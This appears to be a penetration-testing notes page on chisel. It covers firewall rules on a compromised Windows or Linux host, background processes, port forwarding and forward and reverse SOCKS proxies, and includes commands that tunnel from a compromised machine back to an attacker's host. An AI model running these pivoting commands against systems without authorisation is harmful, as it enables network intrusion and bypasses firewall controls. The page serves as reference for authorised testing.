# chisel

{% hint style="danger" %}
Remember not to do TCP SYN scans (-sS) with nmap as this is not yet supported. Use -sT instead, both when discovering hosts and when using basic scripts/port enumeration.
{% endhint %}

Chisel is a very powerful tool that will encapsulate a TCP session in an HTTP tunnel (a bit like Tunna or reGeorg) while securing it via SSH (in the same style as sshuttle).

Chisel is a competition killer, easy to use and powerful. All communications are encrypted thanks to SSH, it supports mutual authentication (login/password for the client, fingerprint matching for the server), automatic reconnection, and has its own SOCKS5 proxy server.

### [Compilation or Download](../../misc/tools.md#chisel)

## Considerations

### Firewall

When opening a server with chisel, it is important to enable that specific port to prevent the firewall from denying traffic through that port.

{% tabs %}
{% tab title="Windows" %}
Example on a Windows system. Before opening a server with chisel, we allow traffic through a random port (Ex: 5556).

```shell
netsh advfirewall firewall add rule name="SOCKS Proxy (1)" protocol=TCP dir=in localport=5556 action=allow
netsh advfirewall firewall add rule name="SOCKS Proxy (2)" protocol=TCP dir=out localport=5556 action=allow

.\chisel.exe server -p 5556 --reverse
```
{% endtab %}

{% tab title="Linux" %}
Example on a Linux system. Before opening a server with chisel, we allow traffic through a random port (e.g. 5556).

```bash
# ufw
ufw allow out from any to any port 5556 proto tcp
ufw allow in from any to any port 5556 proto tcp
# firewall-cmd (CentOS)
firewall-cmd --zone=public --add-port 5556/tcp
```
{% endtab %}
{% endtabs %}

### "Chisel" process in background

It is recommended to have the "chisel" process running in the background, in order to be able to continue using the current console.

{% tabs %}
{% tab title="Windows" %}
```shell
# "Chisel" process in background:
start /b .\chisel.exe server -p 5555 --reverse > C:\Windows\Temp\temp.txt
```
{% endtab %}

{% tab title="Linux" %}
```
sudo ./chisel server -p 5555 --reverse &
```
{% endtab %}
{% endtabs %}

In addition, if we want to kill those background processes, we can do so. We have to get the PID/ID of the "chisel" process and then kill it:

{% tabs %}
{% tab title="Windows" %}
### Get PID

{% hint style="success" %}
To obtain the PID there are many commands, you can see them all [here](../privilege-escalation/windows-privilege-escalation/initial-enumeration-windows.md#get-processes). In this occasion, we are only going to show with the `wmic` command.
{% endhint %}

```
wmic process get ProcessId,Description,ParentProcessId,CommandLine
```

### Kill process

```shell
taskkill /F /PID <PID>
```
{% endtab %}

{% tab title="Linux" %}
### Get PID

```bash
ps aux | grep chisel
```

### Kill process

```bash
sudo kill <PID>
```
{% endtab %}
{% endtabs %}

## Port Forwarding

{% tabs %}
{% tab title="Local Forwarding" %}
```bash
chisel server -p <SERVER PORT> --host 192.168.2.105 -v # Compromised machine.
chisel client -v <IP/PIVOT IP>:<SERVER PORT> <LPORT>:<IP/PIVOT IP>:<RPORT> # Attacker machine.
lsof -i:<PORT> # Verification
```
{% endtab %}

{% tab title="Remote Forwarding" %}
```bash
# Attacker computer:
chisel server -p <SERVER PORT> --reverse # We can add the IP of the pivot machine: --host 192.168.2.149
# Compromised computer:
chisel client <LHOST>:<SERVER PORT> R:<local-host>:<local-port>:<remote-host>:<remote-port>/<protocol> # Complete syntax.
chisel client <LHOST>:<SERVER PORT> R:<LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT> 
# We can also do multiple port forwarding:
chisel client 10.9.5.12:1234 R:445:localhost:445 R:8080:localhost:8080 R:21:localhost:21
```
{% endtab %}
{% endtabs %}

## SOCKS proxy

{% tabs %}
{% tab title="Forward SOCKS proxy" %}
```bash
chisel server -p 8080 --host 192.168.2.105 --socks5 -v # Compromised machine.
chisel client -v http://192.168.2.105:8080 127.0.0.1:33333:socks # Attacker machine
curl --head http://10.42.42.2 --proxy socks5://127.0.0.1:33333 # Verification
```
{% endtab %}

{% tab title="Reverse SOCKS proxy" %}
{% hint style="info" %}
This will start a listener on our machine on port 1080 which is a SOCKS5 proxy through the Chisel client. We can intercept the traffic with Burpsuite, which is explained in the following link: [Use SOCKS Proxy](broken-reference)
{% endhint %}

```bash
clisel server -p <SERVER PORT> --reverse & # Attacker machine.
chisel client <LHOST>:<SERVER PORT> R:socks & # Compromised machine.
```

Now I can use [proxychains](proxychains.md#socks-proxy) or [FoxyProxy](foxy-proxy.md#socks-proxy) to interact with the network behind the target in a natural way.
{% endtab %}
{% endtabs %}
